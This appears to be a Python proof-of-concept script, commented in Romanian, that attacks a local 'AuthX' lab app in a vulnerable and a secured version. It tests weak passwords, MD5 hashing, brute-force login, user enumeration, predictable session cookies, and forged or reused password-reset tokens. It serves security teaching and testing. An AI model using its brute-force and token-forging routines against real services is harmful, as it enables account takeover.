import sys
import hashlib
import base64
import sqlite3
import requests
import bcrypt

V1_URL  = "http://127.0.0.1:8000"  # URL pentru versiunea vulnerabila (v1)
V2_URL  = "http://127.0.0.1:8001"  # URL pentru versiunea securizata (v2)
DB_PATH = "./db/database.db"

def get_base_url():
    if len(sys.argv) > 1 and sys.argv[1] == "v2":
        return V2_URL
    return V1_URL

def cleanup_db():
    """Sterge datele de test din rulari anterioare pentru a permite re-rulare curata."""
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM reset_tokens")
        conn.execute("DELETE FROM sessions")
        conn.execute("DELETE FROM users")
        conn.commit()
        conn.close()
        print("[CLEANUP] Datele de test vechi au fost sterse.")
    except Exception as e:
        print(f"[CLEANUP] Avertisment: {e}")

# =============================================================================
# 4.1 - Politica parola slaba
# =============================================================================
def test_weak_password_policy(base_url):
    print("\n" + "="*60)
    print("[4.1] Test: Politica Parola Slaba")
    print("="*60)
    weak_passwords = ["admin","admin123","Parola123", "Parola123@", "password"]
    for pwd in weak_passwords:
        try:
            email = f"admin@auth.com"
            r = requests.post(f"{base_url}/register",json={"email": email, "password": pwd})
            
            if r.status_code == 200:
                print(f"[!!!] VULNERABIL (v1): Parola '{pwd}' a fost ACCEPTATA!")
            elif r.status_code == 400 and "parol" in r.text.lower():
                print(f"[+] SECURIZAT (v2): Parola '{pwd}' a fost RESPINSA (politica parola).")
            else:
                print(f"    '{pwd}': {r.status_code} - {r.text[:80]}")
        
        except Exception as e:
            print(f"    Eroare: {e}")

# =============================================================================
# 4.2 - Stocare nesigura a parolelor (MD5 vs bcrypt)
# =============================================================================
def test_password_storage():
    print("\n" + "="*60)
    print("[4.2] Test: Stocare Parolelor")
    print("="*60)
    try:

        # Acces la baza de date pentru a verifica cum sunt stocate parolele
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT email, password_hash FROM users LIMIT 5")
        rows = cursor.fetchall()
        conn.close()

        if not rows:
            print("Nu exista utilizatori in DB.")
            return


        # Vizualizare primele 5 parole stocate 
        for row in rows:
            h = row['password_hash']
            if len(h) == 32 and all(c in '0123456789abcdef' for c in h):
                # Hash MD5 detectat fara salt, usor de spart
                print(f"[!!!] VULNERABIL (v1): {row['email']} -> hash MD5: {h}")
                
                # Incercam sa vedem daca hash-ul corespunde parolei "password" 
                # Daca foloseam un salt, hash-ul ar fi fost diferit 
                # si nu am putea detecta parola simpla.
                if h == hashlib.md5(b"password").hexdigest():
                    print(f"PAROLA SPARTA INSTANT!!!  Parola originala: 'password'")

            # Pentru bcrypt, hash-ul incepe cu $2b$ sau $2a$ 
            # si are 60 de caractere plus salt incorporat
            elif h.startswith("$2b$") or h.startswith("$2a$"):
                print(f"[+] SECURIZAT (v2): {row['email']} -> hash bcrypt: {h[:29]}...")

            else:
                print(f"    {row['email']} -> hash: {h[:40]}...")
    except Exception as e:
        print(f"    Eroare acces DB: {e}")

# =============================================================================
# 4.3 - Brute Force / Lipsa rate limiting
# =============================================================================
def test_brute_force(base_url, email, wordlist):
    print("\n" + "="*60)
    print(f"[4.3] Test: Brute Force impotriva {email}")
    print("="*60)
    for pwd in wordlist:
        try:
            r = requests.post(f"{base_url}/login", json={"email": email, "password": pwd})
            
            if r.status_code == 200:
                print(f"[!!!] VULNERABIL (v1): Parola gasita: '{pwd}'! Nicio blocare detectata.")
                return
            elif r.status_code == 429 or "blocat" in r.text.lower():
                print(f"[+] SECURIZAT (v2): Cont BLOCAT dupa prea multe incercari!")
                print(f"    Raspuns: {r.json().get('detail', '')}")
                return
            else:
                print(f"    Incercare '{pwd}': {r.status_code}")
        except Exception as e:
            print(f"    Eroare: {e}")
            return
    print("[-] Brute force terminat fara succes si fara blocare.")

# =============================================================================
# 4.4 - User Enumeration
# =============================================================================
def test_user_enumeration(base_url, email_existent, email_inexistent):
    print("\n" + "="*60)
    print("[4.4] Test: User Enumeration")
    print("="*60)
    for email, label in [(email_existent, "EXISTENT"), (email_inexistent, "INEXISTENT")]:
        try:
            r = requests.post(f"{base_url}/login", json={"email": email, "password": "cevagresit"})
            detail = r.json().get("detail", "")
            if "inexistent" in detail.lower() or "parola" in detail.lower():
                print(f"[!!!] VULNERABIL (v1): user {label} ({email}) -> mesaj diferit: '{detail}'")
            
            elif "credentiale invalide" in detail.lower() or "invalid" in detail.lower():
                print(f"[+] SECURIZAT (v2): user {label} ({email}) -> mesaj generic: '{detail}'")

            else:
                print(f"    {label}: status={r.status_code}, detail='{detail}'")
        except Exception as e:
            print(f"    Eroare: {e}")

# =============================================================================
# 4.5 - Gestionare nesigura a sesiunilor
# =============================================================================
def test_session_security(base_url, email, password):
    print("\n" + "="*60)
    print("[4.5] Test: Securitatea Cookie-ului de Sesiune")
    print("="*60)
    try:
        s = requests.Session()
        r = s.post(f"{base_url}/login", json={"email": email, "password": password})
        if r.status_code != 200:
            print(f"Login esuat: {r.text}")
            return

        cookie = s.cookies.get("session_id")
        if not cookie:
            print("Cookie 'session_id' nu a fost primit.")
            return

        print(f"Cookie session_id: {cookie[:50]}...")

        # Verificam daca token-ul este predictibil (ID numeric = user_id din v1)
        try:
            user_id = int(cookie)
            print(f"[!!!] VULNERABIL (v1): Cookie = ID numeric al utilizatorului ({user_id})!")
            print(f"Oricine poate folosi regula gasita pentru a folosi contului altui user")
        except ValueError:
            print(f"[+] SECURIZAT (v2): Cookie este un token random nepredictibil.")

        # Verificam atributele cookie din header
        set_cookie_header = r.headers.get("set-cookie", "")
        if set_cookie_header:
            has_httponly = "httponly" in set_cookie_header.lower()
            has_samesite = "samesite" in set_cookie_header.lower()
            print(f"    Set-Cookie: {set_cookie_header}")
            if not has_httponly:
                print("[!!!] VULNERABIL (v1): Cookie fara HttpOnly -> accesibil din JS (risc XSS)!")
            else:
                print("[+] SECURIZAT (v2): Cookie are atribut HttpOnly.")
            if not has_samesite:
                print("[!!!] VULNERABIL (v1): Cookie fara SameSite -> risc CSRF!")
            else:
                print("[+] SECURIZAT (v2): Cookie are atribut SameSite.")
    except Exception as e:
        print(f"    Eroare: {e}")

# =============================================================================
# 4.6 - Token resetare parola predictibil sau reutilizabil
# =============================================================================
def test_predictable_token(base_url, email):
    print("\n" + "="*60)
    print(f"[4.6a] Test: Token de resetare predictibil pentru {email}")
    print("="*60)

    requests.post(f"{base_url}/request-reset", json={"email": email})

    # Atacatorul ghiceste tokenul ca Base64(email) - schema v1
    fake_token = base64.urlsafe_b64encode(
        email.encode('utf-8')
    ).decode('utf-8').rstrip('=')
    print(f"    Token ghicit (Base64 email): {fake_token}")

    try:
        r = requests.post(f"{base_url}/reset-password", json={"token": fake_token, "new_password": "HackedPassword123!"})
        if r.status_code == 200:
            print("[!!!] VULNERABIL (v1): Serverul a ACCEPTAT tokenul Base64! Cont preluat!")
        elif r.status_code == 400:
            print("[+] SECURIZAT (v2): Serverul a RESPINS tokenul fabricat (token random).")
        else:
            print(f"    Raspuns: {r.status_code} - {r.text[:80]}")
    except Exception as e:
        print(f"    Eroare: {e}")


def test_token_reuse(base_url, email):
    print(f"\n[4.6b] Test: Token de resetare reutilizabil pentru {email}")
    try:
        # Stergem orice token anterior pentru acest email (evita UNIQUE constraint pe v1)
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM reset_tokens WHERE email = ?", (email,))
            conn.commit()
            conn.close()
        except Exception:
            pass
        r = requests.post(f"{base_url}/request-reset", json={"email": email})
        link = r.json().get("link", "")
        if not link:
            print("    Nu s-a putut obtine link-ul de resetare (user inexistent sau server oprit).")
            return
        token = link.split("token=")[-1]
        print(f"    Token obtinut: {token[:30]}...")

        # Prima utilizare
        r1 = requests.post(f"{base_url}/reset-password",
                           json={"token": token, "new_password": "NewPass1@first"})
        if r1.status_code == 200:
            print("    Prima resetare: REUSITA")
        else:
            print(f"    Prima resetare esuata: {r1.text}")
            return

        # A doua utilizare cu acelasi token
        r2 = requests.post(f"{base_url}/reset-password",
                           json={"token": token, "new_password": "HackedPass2@second"})
        if r2.status_code == 200:
            print("[!!!] VULNERABIL (v1): Token REUTILIZABIL! A doua resetare a reusit!")
        elif r2.status_code == 400:
            print("[+] SECURIZAT (v2): Token one-time! A doua utilizare a fost RESPINSA.")
        else:
            print(f"    Raspuns: {r2.status_code} - {r2.text[:80]}")
    except Exception as e:
        print(f"    Eroare: {e}")

# =============================================================================
# Main
# =============================================================================
if __name__ == "__main__":
    base_url = get_base_url()
    version  = "v2 (SECURIZAT)" if base_url == V2_URL else "v1 (VULNERABIL)"
    print(f"\n{'#'*60}")
    print(f"  AuthX PoC - Ruleaza impotriva: {version}")
    print(f"  URL: {base_url}")
    print(f"{'#'*60}")

    # Curata datele din rulari anterioare pentru a permite re-rulare corecta
    cleanup_db()

    # Un singur cont admin pentru toate testele + un cont separat pentru brute force
    # (brute force trebuie izolat ca sa nu blocheze adminul inainte de testul sesiunilor)
    target_pwd = "parolaSigura123!@#" if base_url == V2_URL else "password"

    r = requests.post(f"{base_url}/register", json={"email": "admin@authx.local", "password": target_pwd})
    print(f"\n[SETUP] Register admin@authx.local -> {r.status_code}: {r.text[:80]}")

    r = requests.post(f"{base_url}/register", json={"email": "bruteforce@authx.local", "password": target_pwd})
    print(f"[SETUP] Register bruteforce@authx.local -> {r.status_code}: {r.text[:80]}")

    # Rulam toate testele
    test_weak_password_policy(base_url)
    test_password_storage()
    test_user_enumeration(base_url, "admin@authx.local", "inexistent@authx.local")
    test_session_security(base_url, "admin@authx.local", target_pwd)
    test_predictable_token(base_url, "admin@authx.local")
    test_token_reuse(base_url, "admin@authx.local")

    # Brute force ultimul, pe cont dedicat (altfel ar bloca adminul)
    common_passwords = ["Parola123", "Parola123@", "Parola1234",
                         "admin", "authx123", "parola1", "password"]
    test_brute_force(base_url, "bruteforce@authx.local", common_passwords)

    print(f"\n{'#'*60}")
    print("  PoC incheiat.")
    print(f"{'#'*60}\n")
